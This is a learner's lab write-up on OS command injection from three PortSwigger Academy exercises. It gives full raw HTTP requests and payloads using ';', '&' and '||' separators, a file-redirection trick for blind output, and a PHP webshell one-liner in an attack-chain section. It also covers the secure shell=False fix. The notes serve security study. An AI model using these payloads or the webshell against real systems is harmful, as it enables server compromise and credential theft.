# Day 40 Notes — OS Command Injection (Blind & Out-of-Band)
---

## 1. What We Did Today Overview

Today we studied **OS Command Injection**. We completed three hands-on labs on PortSwigger:

- **Lab 1**: OS command injection, simple case (visible output)
- **Lab 2**: Blind OS command injection with time delays
- **Lab 3**: Blind OS command injection with output redirection

The goal was to understand both visible and blind exploitation, practice different injection techniques, and document everything with full raw requests and responses for deep analysis.

---

## 2. The Foundation

### 2A — What This Technology Is Actually For

Web applications often need to perform tasks that require interaction with the underlying operating system. Legitimate use cases include:

- Checking product stock by running a backend shell script (`check_stock.sh`)
- Converting images using ImageMagick or similar tools
- Sending emails via the system mail command
- Running network diagnostics (`ping`, `nslookup`, `traceroute`)
- Generating reports or performing backups

Developers implement these features by calling operating system commands from application code. This is normal engineering practice when the application must leverage existing system utilities rather than reimplementing everything in the application language.

### 2B — The Exact Developer Assumption That Breaks

The developer assumes that any data supplied by the user will be **simple, safe values** (such as a numeric ID) and will **never contain characters that have special meaning to the operating system shell**. They treat user input as passive data instead of text that will be parsed and executed by a command interpreter.

### 2C — The Mechanical Explanation (Step by Step)

Most vulnerable code looks like this pattern:

```python
command = f"check_stock.sh {product_id} {store_id}"
subprocess.run(command, shell=True)
```

When `shell=True` is used (or equivalent functions like `system()`, `exec()`, `shell_exec()`), the entire string is passed to `/bin/sh` (or `cmd.exe` on Windows) for parsing.

The shell has its own syntax rules. Characters like `;`, `|`, `&`, `>`, newlines (`%0a`), backticks, and `$( )` have special meaning. When the attacker inserts any of these characters, the shell parser treats everything after the metacharacter as a **separate command**.

The operating system and filesystem have no concept of the developer's original intention. They only execute whatever the shell ultimately decides to run after parsing the string.

### 2D — Real Life Analogy

Imagine a strict but literal hotel concierge who reads every guest request **exactly as written** to the kitchen staff. A normal guest writes "one large pizza." The concierge reads it and the kitchen prepares the pizza.

An attacker writes: "one large pizza; also unlock room 402 and bring me the cash from the drawer." Because the concierge has no understanding of where the legitimate order ends and the malicious instruction begins, he reads the entire message. The kitchen staff follows every instruction they receive. The system fails because there is no boundary between data and commands.

### 2E — Three Required Conditions

1. The application must construct and execute an operating system command that includes user-controlled input.
2. The code must pass the full string to a shell interpreter (e.g., `shell=True` in Python's subprocess).
3. Shell metacharacters in the user input must not be filtered, escaped, or neutralized before the string reaches the shell.

### 2F — What It Can and Cannot Achieve

**Can achieve:**

- Run arbitrary commands with the privileges of the web server process
- Read sensitive files the web user can access
- Write files (including webshells) in writable directories
- Establish reverse shells
- Perform internal network reconnaissance from the server's perspective

**Cannot achieve:**

- Break out of the operating system user privileges assigned to the web server process
- Directly compromise the victim's browser (server-side vulnerability only)
- Bypass strong containerization or mandatory access controls without additional flaws

### 2G — One Real World Case

**Shellshock (CVE-2014-6271)** was a command injection vulnerability in the Bash shell. It allowed attackers to execute arbitrary commands by sending specially crafted environment variables to CGI scripts. It affected millions of servers worldwide and was exploited within hours of public disclosure. On bug bounty platforms, confirmed command injection leading to RCE is almost always rated Critical with high payouts.

---

## 3. Labs Completed

### Lab 1: OS command injection, simple case

**Goal:** Execute a command and see its output directly in the HTTP response.

#### Full Raw Request (that solved the lab)

```
POST /product/stock HTTP/2
Host: 0ab9006c044da8ff80b47bb3003900f7.web-security-academy.net
Cookie: session=uRrLxa1HD9oODpqZSmbgFUSz74K3fjH6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab9006c044da8ff80b47bb3003900f7.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0ab9006c044da8ff80b47bb3003900f7.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=1;whoami&storeId=1
```

#### Full Raw Response

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

/home/peter-o3V8QH/stockreport.sh: line 5: $2: unbound variable
whoami: extra operand '1'
Try 'whoami --help' for more information.
```

**Lab solved.** The error messages proved that the `whoami` command was executed by the shell.

---

### Lab 2: Blind OS command injection with time delays

**Goal:** Confirm command execution when the application returns no output, using response time as the only signal.

#### Full Raw Request (that solved the lab)

```
POST /feedback/submit HTTP/2
Host: 0aad00c704821eab844fa67d0091000f.web-security-academy.net
Cookie: session=LgmRDb7VVeAZNPwOTxqJchJyAzHb2NwW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Origin: https://0aad00c704821eab844fa67d0091000f.web-security-academy.net
Referer: https://0aad00c704821eab844fa67d0091000f.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=HW5GCZJ2P6bCpGfOASnQsTa5FhZ9jrql&name=khush&email=test%40test.com%26+sleep+10+%23&subject=maths&message=dont+know
```

#### Full Raw Response

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2

{}
```

**Observation:** The response arrived after approximately **10 seconds**, confirming that `sleep 10` executed on the server even though the response body was empty.

---

### Lab 3: Blind OS command injection with output redirection

**Goal:** Force the server to write command output to a file, then retrieve that file via the web application.

#### Full Raw Injection Request

```
POST /feedback/submit HTTP/2
Host: 0a11008a047ce82e80917b1c002a0002.web-security-academy.net
Cookie: session=f7Ob9y7suM61ns49nJEIBgkr7yILLkc2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Origin: https://0a11008a047ce82e80917b1c002a0002.web-security-academy.net
Referer: https://0a11008a047ce82e80917b1c002a0002.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=cuIA2fqFBrKfb0T0rZO7LI5JWhmtXDlg&name=test&email=test%40test.com||whoami>/var/www/images/output.txt||&subject=test&message=test
```

#### Full Raw Verification Request

```
GET /image?filename=output.txt HTTP/2
Host: 0a11008a047ce82e80917b1c002a0002.web-security-academy.net
Cookie: session=f7Ob9y7suM61ns49nJEIBgkr7yILLkc2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a11008a047ce82e80917b1c002a0002.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5
Te: trailers
```

#### Full Raw Response (from verification request)

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-pD7Ftb
```

**Lab solved.** The username `peter-pD7Ftb` was successfully written to a web-accessible file and retrieved.

---

## 4. Every Command Explained — Full Breakdown

### Lab 1 – Injection Payload Breakdown

**The full payload (body):**

```
productId=1;whoami&storeId=1
```

**Broken into pieces:**

- `productId=1;` — Provides a seemingly valid value for the first parameter and uses `;` as a shell command separator to end the original intended command.
- `whoami` — The command we want executed. It prints the username of the current process owner.
- `&storeId=1` — Supplies the second required parameter so the HTTP request remains structurally valid to the backend.

**What happens when this runs, step by step:**

1. The application constructs a string similar to `check_stock.sh 1;whoami 1`.
2. Because the code uses `shell=True` (or equivalent), the entire string is passed to `/bin/sh`.
3. The shell parses `;` as a separator and executes two separate commands.
4. The output (and errors) from both commands are combined and returned in the HTTP response.

**Why each piece is necessary:**  
If the `;` separator is removed, the shell treats the entire string as arguments to a single command and `whoami` is never executed as a separate command.

---

### Lab 2 – Injection Payload Breakdown

**The critical portion of the payload (URL-decoded):**

```
email=test@test.com& sleep 10 #
```

**Broken into pieces:**

- `&` — Shell command separator that runs the following command unconditionally.
- `sleep 10` — Tells the operating system to pause the current process for 10 seconds.
- `#` — Shell comment character. Everything after `#` on the same line is ignored, neutralizing any trailing input.

**What happens when this runs, step by step:**

1. The application builds a command string containing the attacker-controlled email value.
2. The shell parses the `&` and executes `sleep 10` as a new command.
3. The web server process pauses for 10 seconds before continuing.
4. The application eventually returns a response (in this case an empty JSON object `{}`).

**Why each piece is necessary:**  
Without a measurable side effect like `sleep`, there would be no way to confirm execution in a blind scenario where no output is returned.

---

### Lab 3 – Injection + Exfiltration Breakdown

**The critical portion of the injection payload:**

```
email=test@test.com||whoami>/var/www/images/output.txt||
```

**Broken into pieces:**

- `||` — Logical OR / command separator. Executes the next command regardless of whether the previous one failed.
- `whoami` — The command whose output we want to capture.
- `>` — Output redirection operator. Sends stdout to the specified file instead of the terminal/response.
- `/var/www/images/output.txt` — Target file path inside a directory served statically by the web server.
- `||` (trailing) — Additional separator to cleanly terminate the injected command and prevent shell parse errors from trailing input.

**What happens when this runs, step by step:**

1. The shell executes `whoami`.
2. The `>` operator redirects the output of `whoami` into `/var/www/images/output.txt`.
3. Later, the attacker requests `/image?filename=output.txt`.
4. The application reads and returns the contents of that file (`peter-pD7Ftb`).

**Why each piece is necessary:**  
The redirection (`>`) is what allows us to exfiltrate output in a blind scenario. Without writing to a web-accessible location, we would have no way to retrieve the result.

---

## 5. Vulnerable Source Code — Line by Line

Source code was not viewed in this session. Below is a representative vulnerable pattern that matches the behavior observed in these labs:

```python
import subprocess

def check_stock(product_id, store_id):
    command = f"check_stock.sh {product_id} {store_id}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout
```

**Line-by-line analysis:**

`command = f"check_stock.sh {product_id} {store_id}"`
- **What it does:** Concatenates user input directly into a shell command string.
- **Why it's a problem:** Any shell metacharacters in `product_id` or `store_id` will be interpreted by the shell parser, not treated as literal data.

`subprocess.run(command, shell=True, ...)`
- **What it does:** Tells Python to invoke a shell (`/bin/sh`) to parse and execute the string.
- **Why it's a problem:** This is the critical mistake that enables command injection. Using `shell=False` with a list of arguments would pass each argument directly to `execve()`, bypassing shell interpretation entirely.

---

## 6. What Failed and Why

- In Lab 1, the backend script produced errors about unbound variables. These errors actually helped confirm that our injected command reached the shell and was executed.
- Early attempts in blind labs with insufficient delays or wrong parameter fields produced no observable effect. Switching to `sleep 10` and targeting the `email` field produced clear timing signals.
- In Lab 3, we had to identify the correct static file serving endpoint (`/image?filename=...`) to retrieve the file we wrote to disk.

---

## 7. Chain Thinking

```
OS Command Injection (any variant)
↓ Grants ability to run arbitrary system commands
Write a webshell to disk
  → echo '<?php system($_GET["cmd"]);?>' > /var/www/html/shell.php
↓ Creates a persistent, easy-to-use backdoor
Access the webshell via browser
  → /shell.php?cmd=id
↓ Interactive command execution from browser
Read application config files
  → database credentials, API keys, .env files
↓ Lateral movement and data exfiltration
```

Each step is possible because command injection grants code execution on the server under web process privileges.

---

## 8. Real World Context

OS Command Injection is considered one of the most severe web vulnerabilities because it frequently leads to full server compromise. On bug bounty platforms it is almost always classified as **Critical**. Real-world examples include mass exploitation of Shellshock (CVE-2014-6271) and numerous high-severity findings on HackerOne, Bugcrowd, and Intigriti. Any confirmed RCE via command injection is typically a top-tier payout.

---

## 9. The Fix — Full Technical Breakdown

**Vulnerable pattern:**

```python
command = f"check_stock.sh {product_id} {store_id}"
subprocess.run(command, shell=True)
```

**Secure pattern:**

```python
import subprocess

if not (product_id.isdigit() and store_id.isdigit()):
    raise ValueError("Invalid input")

result = subprocess.run(
    ["check_stock.sh", product_id, store_id],
    shell=False,
    capture_output=True,
    text=True
)
```

**Why the fix works:**  
`shell=False` causes Python to call the program directly using `execve()` with arguments passed as a list. No shell is invoked, so metacharacters like `;`, `|`, and `&` have no special meaning and are treated as literal strings.

**Defense in depth:**

- Strict whitelist validation on all input used in system commands
- Run the web application with the lowest possible operating system privileges (principle of least privilege)
- Avoid calling external OS commands from web application code whenever a library alternative exists
- Use Web Application Firewalls as a secondary detection layer (not a primary defense)

---

## 10. Key Concepts Summary

| Concept | Description | Why It Matters |
|---|---|---|
| Visible vs Blind | Direct output vs side-channel required | Most real-world cases are blind |
| Command Separator | `;`, `&`, `\|\|`, `%0a` | Allows breaking out of the intended command |
| Output Redirection (`>`) | Writes command output to a file | Primary exfiltration method in blind cases |
| `shell=True` | Invokes shell parser on the full string | The root cause in most command injection |
| Time-based detection | Using `sleep` for observable delay | Reliable confirmation when output is hidden |

---

## 11. Command and Payload Reference

| Lab | Type | Payload |
|---|---|---|
| Lab 1 | Visible output | `productId=1;whoami&storeId=1` |
| Lab 2 | Blind time delay | `email=test@test.com%26+sleep+10+%23` |
| Lab 3 | Blind redirection | `email=test@test.com\|\|whoami>/var/www/images/output.txt\|\|` |

**Common shell metacharacters:**

| Character | Shell Meaning |
|---|---|
| `;` | Run next command unconditionally (sequential) |
| `&` | Run next command unconditionally (background) |
| `\|\|` | Run next command only if previous failed |
| `&&` | Run next command only if previous succeeded |
| `\|` | Pipe stdout of left command to stdin of right |
| `>` | Redirect stdout to file (overwrite) |
| `>>` | Redirect stdout to file (append) |
| `#` | Comment — ignore everything after this |
| `%0a` | URL-encoded newline — acts as command separator |

---

## 12. Foundation Checklist

- Can you explain why `shell=True` is dangerous even when input appears to be numeric?
- If a developer claims they "escape special characters," can you explain why this approach is often still bypassable?
- Why does writing output to a file sometimes succeed as an exfiltration method when timing-based detection is unreliable?
- What is the fundamental difference between passing arguments as a list versus as a single string to `subprocess.run()`?
- If you observe a 10-second delay after injecting `sleep 10`, what exactly have you proven about the application?

---

## 13. Related PortSwigger Labs (Not Completed This Session)

| Lab | Technique | Why It Matters |
|---|---|---|
| Blind OS command injection with out-of-band interaction | DNS/HTTP callback via Burp Collaborator | Used when timing is unreliable and no writable web directory exists |
| Blind OS command injection with out-of-band data exfiltration | Exfiltrate data via DNS subdomain lookup | Allows data retrieval in fully blind, no-write scenarios |

> Note: Both OOB labs require Burp Suite Professional (Collaborator). On Community Edition, document the technique conceptually and replicate when Pro access is available.

---
